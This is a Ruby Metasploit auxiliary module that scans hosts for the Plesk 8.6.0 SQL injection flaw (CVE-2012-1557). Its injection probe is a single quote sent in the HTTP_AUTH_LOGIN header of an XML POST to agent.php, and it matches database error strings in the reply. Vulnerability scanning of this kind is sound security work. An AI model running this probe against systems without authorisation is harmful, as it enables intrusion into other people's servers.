require 'msf/core'
class Metasploit3 < Msf::Auxiliary
		include Msf::Exploit::Remote::HttpClient
		include Msf::Auxiliary::Scanner
		def initialize
				super(
						'Name'           => 'Plesk 8.6.0 Vulnerability Scanner',
						'Description'    => 'This module scans network host[s] for vulnerable plesk installations',
						'Author'         =>
							[
								'Gaurav Baruah <gaurav[at]esecforte.com>',
								'Sachin Kumar <sachin[at]esecforte.com>',
								'Vivek Razdan <vivek[at]esecforte.com>'
								#'eSecForte Technologies Pvt. Ltd. <sploitlab[at]esecforte.com>',
							],
						'License'        => MSF_LICENSE,
						'References'     =>
							[
								['CVE', '2012-1557'],
								['URL', 'http://www.esecforte.com/blog/exploring-plesks-unspecified-vulnerability/'],
								['URL', 'http://krebsonsecurity.com/2012/07/plesk-0day-for-sale-as-thousands-of-sites-hacked/']
							]
					)
					register_options(
						[
								Opt::RPORT(8880)
						], self.class)
		end

		def run_host(ip)
			data = <<-EOF
<?xml version="1.0" encoding="UTF-8"?><packet version="1.5.1.0">
<dns><add_rec><domain_id>1</domain_id><type>A</type><host>mail</host>
<value>127.0.0.1</value></add_rec></dns></packet>
EOF
			if(connect())
				passwd = rand_text_alpha(6)
				res = send_request_raw({
				'uri'	  => "/enterprise/control/agent.php",
				'method'  => 'POST',
				'data'    => data,
				'headers' =>
				{
					'HTTP_AUTH_LOGIN'	 => "'",
					'HTTP_AUTH_PASSWD'	 => passwd,
					'Content-Type'       => 'text/xml',
					'Content-Length'     => data.length,
				}
				}, 25)
				if (res)
					if(res.body[/MySQL/])
						print_good("#{ip} is Vulnerable to MySQL injection")
					elsif (res.body[/Microsoft OLE DB/])
						print_good("#{ip} is Vulnerable to MSSQL injection")
					elsif (res.body[/Jet/])
						print_good("#{ip} is Vulnerable to JET SQLi")
					else
						print_error("#{ip} is not vulnerable")
					end
				end
			end
		end
end